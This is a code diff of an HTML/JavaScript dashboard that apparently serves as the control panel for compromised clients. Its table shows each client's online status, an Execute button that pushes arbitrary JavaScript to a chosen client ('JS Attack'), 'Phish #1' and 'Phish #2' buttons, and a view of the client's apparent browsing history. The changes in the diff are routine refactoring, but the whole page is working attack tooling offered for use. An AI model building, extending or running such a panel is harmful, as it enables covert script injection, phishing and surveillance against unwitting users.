@@ -32,13 +32,9 @@
 
             table.on('draw', function () {
                 table.rows().every(function (index) {
-
-                    console.log('.name' + (index + 1));
                     var id = $('#example').find('.name' + (index + 1)).attr('id');
-                    console.log(id);
                     var b = "childRow" + id;
                     var stuff = "";
-                    console.log(stuff);
 
                     this
                         .child(
@@ -54,10 +50,7 @@
 
             table.rows().every(function (index) {
                 var id = $('#example').find('.name' + (index + 1)).attr('id');
-                console.log(id);
                 var b = "childRow" + id;
-                var stuff = "";
-                console.log(stuff);
 
                 this
                     .child(
@@ -73,7 +66,7 @@
             var socket = io.connect();
 
             socket.on('disconnectSuccessful', function (id) {
-                var fullid = "status" + id.id;
+                var fullid = "status" + id;
                 var element = document.getElementById(fullid);
                 element.style.backgroundColor = "red";
                 element.innerHTML = "Offline";
@@ -85,52 +78,52 @@
                 console.log("web app disconnected from server")
             });
             socket.on('connectSuccessful', function (id) {
-                var fullid = "status" + id.id;
+                var fullid = "status" + id;
                 var element = document.getElementById(fullid);
                 element.style.backgroundColor = "green";
                 element.innerHTML = "Online"
             });
 
             socket.on('pingSuccessful', function (id) {
-                get_info_display_same_page(id.id, 'false');
+                get_info_display_same_page(id, 'false');
             });
 
 
             socket.on('newClientInstall', function (id) {
-
-                var rowInfo = '<tr id="row' + id.id + '" class="userrow" style="background-color: transparent">';
+                console.log(id);
+                var rowInfo = '<tr id="row' + id + '" class="userrow" style="background-color: transparent">';
                 var idName = '<td class="text-center rowtext" style="background-color: transparent">' +
                         '<button class="transparentbutton" id="clientid"' +
-                        'onclick="get_info_display_new_tab(' + id.id + ')">'
-                        + '<u class="name' + (table.rows().count() + 1) + '" id="' + id.id + '">' + id.id + '</u></button>' +
+                        'onclick="get_info_display_new_tab(' + id + ')">'
+                        + '<u class="name' + (table.rows().count() + 1) + '" id="' + id + '">' + id  + '</u></button>' +
                         '</td>';
-                var status = '<td class="text-center rowtext" id="status' + id.id + '"style="background-color: green;'
+                var status = '<td class="text-center rowtext" id="status' + id + '"style="background-color: green;'
                     + '">Online </td>';
 
-                var url = '<td><input id="pattern' + id.id + '" type="text" class="form-control"' +
+                var url = '<td><input id="pattern' + id + '" type="text" class="form-control"' +
                     'aria-label="Text input with segmented dropdown button"></td>';
 
                 var js_input = '<td class="text-center"> <form class="input-group">' +
-                    '<input id="' + id.id + '" type="text" class="form-control"' +
+                    '<input id="input' + id + '" type="text" class="form-control"' +
                     'aria-label="Text input with segmented dropdown button">' +
                     '<div class="input-group-append    ">' +
                     '<button type="reset" class="btn btn-outline-secondary buttontext"' +
-                    'onclick="call_javascript(' + id.id + ')">Execute' +
+                    'onclick="call_javascript(' + id + ')">Execute' +
                     '</button> </div> </form> </td>';
 
                 var phish_buttons = '<td class="text-center">' +
                     '<div class="btn-group" role="group" aria-label="Basic example">' +
                     '<button type="button" class="btn btn-outline-secondary buttontext"' +
-                    'onclick="call_phishing(' + id.id + ',1)">Phish #1</button>' +
+                    'onclick="call_phishing(' + id + ',1)">Phish #1</button>' +
                     '<button type="button" class="btn btn-outline-secondary buttontext"' +
-                    'onclick="call_phishing(' + id.id + ',2)">Phish #2</button></div></td>';
+                    'onclick="call_phishing(' + id + ',2)">Phish #2</button></div></td>';
 
-                var infobutton = '<td><a id="viewinfo' + id.id + '" class="btn btn-primary" data-toggle="collapse"'
-                    + 'role="button" aria-expanded="false" aria-controls="collapse' + id.id + '"' +
-                    'onclick="get_info_display_same_page(' + id.id + ')">View Info</a></td>';
+                var infobutton = '<td><a id="viewinfo' + id + '" class="btn btn-primary" data-toggle="collapse"'
+                    + 'role="button" aria-expanded="false" aria-controls="collapse' + id + '"' +
+                    'onclick="get_info_display_same_page(' + id + ')">View Info</a></td>';
 
 
-                var childrowid = "childRow" + id.id;
+                var childrowid = "childRow" + id;
 
                 table.row.add($(rowInfo +
                     idName +
@@ -142,8 +135,8 @@
                     '</tr>')[0]
                 ).child(
                     $(
-                        '<tr class="col-md-12" id="moreinfo' + id.id + '">' +
-                        '<td colspan="6" class="' + childrowid + ' collapse" ' + 'id=' + childrowid + '>' + id.id + '</td>' +
+                        '<tr class="col-md-12" id="moreinfo' + id + '">' +
+                        '<td colspan="6" class="' + childrowid + ' collapse" ' + 'id=' + childrowid + '>' + id + '</td>' +
                         '</tr>'
                     )
                 ).show().draw(false);
@@ -151,7 +144,7 @@
             });
 
             socket.on('clientUninstall', function (id) {
-                var toRemove = '#row' + id.id;
+                var toRemove = '#row' + id;
                 table.row(toRemove).remove().draw(false);
             })
         });
@@ -176,8 +169,8 @@
 
 <table id="example" class="table table-responsive" style="width: 100%">
     <thead class="thead-dark">
-    <tr>
-        <th class="text-center">ID</th>
+    <tr id="heading">
+        <th class="text-center"><u>ID</u></th>
         <th class="text-center">Status</th>
         <th class="text-center">URL/Pattern</th>
         <th class="text-center">JS Attack</th>
@@ -215,7 +208,7 @@
                        aria-label="Text input with segmented dropdown button"></td>
             <td class="text-center">
                 <form class="input-group">
-                    <input id="{{ item[0] }}" type="text" class="form-control"
+                    <input id="input{{ item[0] }}" type="text" class="form-control"
                            aria-label="Text input with segmented dropdown button">
                     <div class="input-group-append    ">
                         <button type="reset" class="btn btn-outline-secondary buttontext"
@@ -259,7 +252,7 @@
             type: "post",
             data: {
                 id: person,
-                js: document.getElementById(person).value,
+                js: document.getElementById("input"+person).value,
                 pattern: document.getElementById("pattern" + person).value
             },
             success: function (response) {
@@ -274,7 +267,6 @@
 
     function call_phishing(id, attackNumber) {
         document.getElementById("success-message").innerHTML = "Phishing Attack #" + attackNumber + " on " + id + " sent!";
-
         $('.success').fadeIn().delay(500).fadeOut();
         $.ajax({
             url: "/phish",
@@ -305,7 +297,7 @@
                 fullbh: 'true',
             },
             success: function (response) {
-                console.log('Success');
+                console.log('success')
                 var new_page = window.open();
                 new_page.document.write(response)
                 new_page.document.title = person
@@ -331,7 +323,7 @@
                         fullbh: 'false',
                     },
                     success: function (response) {
-                        console.log('Success');
+                        console.log('success')
                         var a = "collapse" + person;
 
                         childRow.innerHTML = response;
@@ -353,7 +345,7 @@
                     fullbh: 'false',
                 },
                 success: function (response) {
-                    console.log('Success');
+                    console.log('success')
                     var a = "collapse" + person;
 
                     childRow.innerHTML = response;
